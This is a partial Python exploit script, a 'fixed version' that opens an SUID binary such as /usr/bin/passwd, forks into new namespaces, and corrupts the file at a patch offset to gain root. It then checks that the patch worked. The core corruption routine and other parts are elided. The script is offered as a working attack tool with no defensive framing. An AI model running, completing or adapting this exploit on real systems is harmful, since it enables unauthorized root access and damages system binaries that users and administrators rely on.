...
Fixed version - supports custom target file
"""
...
SEQ_VAL = 200
REPLAY_SEQ = 100
DEFAULT_TARGET = "/usr/bin/passwd"  # Changed default to passwd
PAYLOAD_LEN = 192
PATCH_OFFSET = 0
...
def corrupt_su(target_fd, target_path):
...
def main():
    ...
    parser.add_argument('--offset', 
                        type=int, 
                        default=PATCH_OFFSET,
                        help=f'Patch offset in the binary (default: {PATCH_OFFSET})')
    
    args = parser.parse_args()
    
    # List available SUID binaries if requested
    ...
    if not os.access(target_path, os.R_OK):
        print(f"[-] Cannot read {target_path}. Try a different target or check permissions.")
        sys.exit(1)
    
    # Check if target is SUID
    if not (os.stat(target_path).st_mode & 0o4000):
        print(f"[!] Warning: {target_path} is not SUID. Exploit may still work but won't grant root privileges.")
    ...
    # Open the target file BEFORE forking (in original namespace)
    try:
        target_fd = os.open(target_path, os.O_RDONLY)
    except PermissionError as e:
        print(f"[-] Cannot open {target_path}: {e}")
        print("[*] Make sure you have read access to the target file")
        sys.exit(1)
    
    # Fork so child enters namespaces and parent stays in original for target spawn
    cpid = os.fork()
    if cpid < 0:
        print("[-] fork failed")
        sys.exit(1)
    if cpid == 0:
        try:
            corrupt_su(target_fd, target_path)
            os._exit(0)
    ...
    # Parent closes the fd (child has its own copy)
    os.close(target_fd)
    ...
    if is_target_already_patched(target_path):
        ...
        print("[-] Verification failed. The target file may not have been corrupted correctly.")
        sys.exit(1)
